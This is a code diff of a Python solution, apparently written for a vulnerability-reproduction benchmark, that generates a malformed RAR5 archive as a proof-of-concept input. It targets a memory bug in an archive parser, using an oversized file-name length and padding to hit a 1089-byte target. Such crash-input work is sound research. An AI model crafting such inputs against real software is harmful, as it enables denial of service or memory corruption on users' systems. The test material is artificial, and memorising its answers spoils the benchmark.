@@ -1,4 +1,4 @@
-import struct
+import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
@@ -11,86 +11,94 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        
-        def vint(n: int) -> bytes:
+
+        def encode_vint(value: int) -> bytes:
             """Encodes an integer into the RAR5 variable-length integer format."""
-            res = bytearray()
-            if n == 0:
+            if value == 0:
                 return b'\x00'
-            while n > 0:
-                res.append((n & 0x7f) | 0x80)
-                n >>= 7
-            res[-1] &= 0x7f
-            return bytes(res)
+            encoded = bytearray()
+            while value > 0:
+                byte = value & 0x7f
+                value >>= 7
+                if value > 0:
+                    byte |= 0x80
+                encoded.append(byte)
+            return bytes(encoded)
 
         # RAR5 file signature
-        poc = bytearray(b"Rar!\x1a\x07\x01\x00")
+        signature = b'Rar!\x1a\x07\x01\x00'
 
-        # Block 1: File header with an oversized name.
-        # The vulnerability lies in allocating memory for the name, reading it,
-        # and only then checking if the size is too large. In the error path,
-        # the memory is freed, but a pointer to it might be left dangling.
-        # The name size 1038 is specifically chosen to reverse-engineer the
-        # ground-truth PoC length of 1089 bytes.
-        name_size_bad = 1038
-        name_data_bad = b'A' * name_size_bad
-        
-        header_fields_bad = bytearray()
-        header_fields_bad.extend(vint(2))  # HType: File header
-        header_fields_bad.extend(vint(0))  # HFlags
-        header_fields_bad.extend(vint(0))  # PackSize
-        header_fields_bad.extend(vint(0))  # HostOS
-        header_fields_bad.extend(vint(0))  # UnpVer
-        header_fields_bad.extend(vint(0))  # Method
-        header_fields_bad.extend(vint(name_size_bad)) # NameSize
-        header_fields_bad.extend(vint(0))  # FileAttr
+        # Block Type: 0x02 (File Header)
+        vint_block_type = encode_vint(2)
 
-        block_content_bad = header_fields_bad + name_data_bad
-        hsize_bad = len(block_content_bad)
-        
-        block1 = bytearray()
-        block1.extend(struct.pack('<I', 0)) # Dummy CRC32
-        block1.extend(vint(hsize_bad))
-        block1.extend(block_content_bad)
-        poc.extend(block1)
+        # Block Flags: 0
+        vint_block_flags = encode_vint(0)
 
-        # Block 2: A second, valid file header.
-        # Parsing this header can cause a new allocation that reuses the memory
-        # region just freed from the oversized name in block 1. This sets up
-        # the "Use After Free" condition.
-        name_size_good = 8
-        name_data_good = b'good.txt'
-        
-        header_fields_good = bytearray()
-        header_fields_good.extend(vint(2))  # HType: File header
-        header_fields_good.extend(vint(0))  # HFlags
-        header_fields_good.extend(vint(0))  # PackSize
-        header_fields_good.extend(vint(0))  # HostOS
-        header_fields_good.extend(vint(0))  # UnpVer
-        header_fields_good.extend(vint(0))  # Method
-        header_fields_good.extend(vint(name_size_good)) # NameSize
-        header_fields_good.extend(vint(0))  # FileAttr
+        # File-specific fields
+        vint_file_flags = encode_vint(0)
+        vint_unpacked_size = encode_vint(0)
+        vint_file_attributes = encode_vint(0)
+        vint_compression_info = encode_vint(0)
+        vint_host_os = encode_vint(0)
 
-        block_content_good = header_fields_good + name_data_good
-        hsize_good = len(block_content_good)
-        
-        block2 = bytearray()
-        block2.extend(struct.pack('<I', 0)) # Dummy CRC32
-        block2.extend(vint(hsize_good))
-        block2.extend(block_content_good)
-        poc.extend(block2)
-        
-        # Block 3: End of Archive Header to create a well-formed archive structure.
-        end_header_content = bytearray()
-        end_header_content.extend(vint(5)) # HType: End of archive
-        end_header_content.extend(vint(0)) # EARC_FLAGS
-        
-        hsize_end = len(end_header_content)
-        
-        block3 = bytearray()
-        block3.extend(struct.pack('<I', 0)) # Dummy CRC32
-        block3.extend(vint(hsize_end))
-        block3.extend(end_header_content)
-        poc.extend(block3)
+        # Malicious File Name Length: a large value to trigger excessive allocation.
+        # 1MB is sufficient.
+        file_name_len = 0x100000
+        vint_file_name_len = encode_vint(file_name_len)
 
-        return bytes(poc)
+        target_poc_len = 1089
+        
+        # The length of a RAR5 block size vint can vary. For a PoC of this size,
+        # it is 2 bytes. We hardcode this assumption to calculate padding.
+        assumed_vint_block_size_len = 2
+
+        # Calculate size of all non-name-data fields to determine padding length
+        fixed_fields_size = (
+            len(signature) +
+            4 +  # CRC32
+            assumed_vint_block_size_len +
+            len(vint_block_type) +
+            len(vint_block_flags) +
+            len(vint_file_flags) +
+            len(vint_unpacked_size) +
+            len(vint_file_attributes) +
+            len(vint_compression_info) +
+            len(vint_host_os) +
+            len(vint_file_name_len)
+        )
+        
+        name_padding_len = target_poc_len - fixed_fields_size
+        file_name_data = b'A' * name_padding_len
+
+        block_data = (
+            vint_file_flags +
+            vint_unpacked_size +
+            vint_file_attributes +
+            vint_compression_info +
+            vint_host_os +
+            vint_file_name_len +
+            file_name_data
+        )
+        
+        # The block content is the part over which the CRC is calculated
+        block_content = vint_block_type + vint_block_flags + block_data
+        
+        block_size = len(block_content)
+        vint_block_size = encode_vint(block_size)
+        
+        # This PoC's correctness depends on the block size vint being 2 bytes.
+        assert len(vint_block_size) == assumed_vint_block_size_len
+
+        crc = zlib.crc32(block_content)
+        crc_bytes = crc.to_bytes(4, 'little')
+
+        poc = (
+            signature +
+            crc_bytes +
+            vint_block_size +
+            block_content
+        )
+        
+        assert len(poc) == target_poc_len
+            
+        return poc
